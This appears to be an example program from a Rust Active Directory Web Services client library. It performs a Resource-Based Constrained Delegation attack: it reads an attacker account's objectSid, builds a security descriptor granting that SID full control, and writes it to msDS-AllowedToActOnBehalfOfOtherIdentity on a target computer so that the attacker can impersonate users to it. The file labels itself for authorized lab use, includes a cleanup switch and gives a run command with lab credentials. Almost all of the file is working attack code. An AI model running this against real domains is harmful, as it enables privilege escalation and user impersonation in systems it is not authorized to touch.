//! Prove a BINARY write over ADWS: set `msDS-AllowedToActOnBehalfOfOtherIdentity`
//! (Resource-Based Constrained Delegation) on a target computer, so the attacker
//! principal can impersonate users to it.
//!
//! This demonstrates the base64Binary value path: it reads the attacker's
//! `objectSid` (raw bytes), builds a self-relative security descriptor granting
//! that SID, and writes the descriptor as a binary attribute value.
//!
//! Authorized lab use only (e.g. GOAD). Run with `ADWS_CLEAR=1` to remove the
//! delegation again.
//!
//! ```bash
//! RUST_LOG=trace ADWS_HOST=meereen.essos.local ADWS_DOMAIN=essos.local \
//! ADWS_USER=daenerys.targaryen ADWS_PASS='BurnThemAll!' \
//! ADWS_TARGET='BRAAVOS$' ADWS_ATTACKER=g0h4n \
//! cargo run --example rbcd --features sspi-auth
//! ```

use std::env;

use adws::client::Target;
use adws::{AdwsClient, Credentials, Mod, Scope, SdFlags};

const ATTR_RBCD: &str = "msDS-AllowedToActOnBehalfOfOtherIdentity";

fn req(key: &str) -> String {
    env::var(key).unwrap_or_else(|_| panic!("missing env var {key}"))
}

/// Build a minimal self-relative security descriptor whose DACL grants full
/// control to `sid` (the raw objectSid bytes). This is the RBCD descriptor
/// stored in `msDS-AllowedToActOnBehalfOfOtherIdentity`.
fn build_rbcd_sd(sid: &[u8]) -> Vec<u8> {
    let sid_len = sid.len();
    let ace_size = 8 + sid_len; // AceHeader(4) + Mask(4) + SID
    let acl_size = 8 + ace_size; // AclHeader(8) + one ACE
    let owner_off: u32 = 20; // header is 20 bytes
    let dacl_off: u32 = 20 + sid_len as u32; // after the owner SID

    let mut sd = Vec::new();
    // --- SECURITY_DESCRIPTOR (self-relative) header ---
    sd.push(0x01); // Revision
    sd.push(0x00); // Sbz1
    sd.extend_from_slice(&0x8004u16.to_le_bytes()); // Control: SELF_RELATIVE | DACL_PRESENT
    sd.extend_from_slice(&owner_off.to_le_bytes()); // OffsetOwner
    sd.extend_from_slice(&0u32.to_le_bytes()); // OffsetGroup (none)
    sd.extend_from_slice(&0u32.to_le_bytes()); // OffsetSacl (none)
    sd.extend_from_slice(&dacl_off.to_le_bytes()); // OffsetDacl
    // --- Owner SID ---
    sd.extend_from_slice(sid);
    // --- DACL (ACL header) ---
    sd.push(0x02); // AclRevision
    sd.push(0x00); // Sbz1
    sd.extend_from_slice(&(acl_size as u16).to_le_bytes()); // AclSize
    sd.extend_from_slice(&1u16.to_le_bytes()); // AceCount
    sd.extend_from_slice(&0u16.to_le_bytes()); // Sbz2
    // --- ACCESS_ALLOWED_ACE ---
    sd.push(0x00); // AceType = ACCESS_ALLOWED_ACE_TYPE
    sd.push(0x00); // AceFlags
    sd.extend_from_slice(&(ace_size as u16).to_le_bytes()); // AceSize
    sd.extend_from_slice(&0x000F_01FFu32.to_le_bytes()); // Mask = full control
    sd.extend_from_slice(sid); // trustee SID
    sd
}

async fn find_dn_and_sid(
    client: &mut AdwsClient,
    base: &str,
    sam: &str,
) -> (String, Option<Vec<u8>>) {
    let filter = format!("(sAMAccountName={sam})");
    let entry = client
        .search(base, Scope::Subtree, &filter, &["objectSid"], None, false)
        .await
        .expect("search failed")
        .into_iter()
        .next()
        .unwrap_or_else(|| panic!("account {sam} not found"));
    let sid = entry.bin_attrs.get("objectSid").and_then(|v| v.first()).cloned();
    (entry.dn, sid)
}

#[tokio::main]
async fn main() -> adws::Result<()> {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();

    let host = req("ADWS_HOST");
    let domain = req("ADWS_DOMAIN");
    let user = req("ADWS_USER");
    let pass = req("ADWS_PASS");
    let target_sam = req("ADWS_TARGET"); // computer, e.g. BRAAVOS$
    let attacker_sam = req("ADWS_ATTACKER"); // principal getting delegation rights
    let clear = env::var("ADWS_CLEAR").is_ok();

    let base = domain
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",");

    let target = Target::new(host, domain.clone());
    let creds = Credentials::Password { domain, username: user, password: pass };
    let mut client = AdwsClient::connect(target, creds).await?;

    let (target_dn, _) = find_dn_and_sid(&mut client, &base, &target_sam).await;

    if clear {
        eprintln!("[*] clearing {ATTR_RBCD} on {target_dn}");
        client.modify(&target_dn, &[Mod::delete_all(ATTR_RBCD)], None::<SdFlags>).await?;
        eprintln!("[+] RBCD delegation removed");
        return Ok(());
    }

    let (_, attacker_sid) = find_dn_and_sid(&mut client, &base, &attacker_sam).await;
    let attacker_sid = attacker_sid.expect("attacker objectSid not returned");
    eprintln!("[*] attacker {attacker_sam}: objectSid is {} bytes", attacker_sid.len());

    let sd = build_rbcd_sd(&attacker_sid);
    eprintln!("[*] built RBCD security descriptor ({} bytes)", sd.len());
    eprintln!("[*] writing {ATTR_RBCD} on {target_dn}");

    // Binary attribute value => rendered as xsi:type="xsd:base64Binary".
    client.modify(&target_dn, &[Mod::replace(ATTR_RBCD, [sd])], None::<SdFlags>).await?;

    eprintln!("[+] binary write OK: {attacker_sam} can now act on behalf of others to {target_sam}");
    eprintln!("    (re-run with ADWS_CLEAR=1 to remove it)");
    Ok(())
}
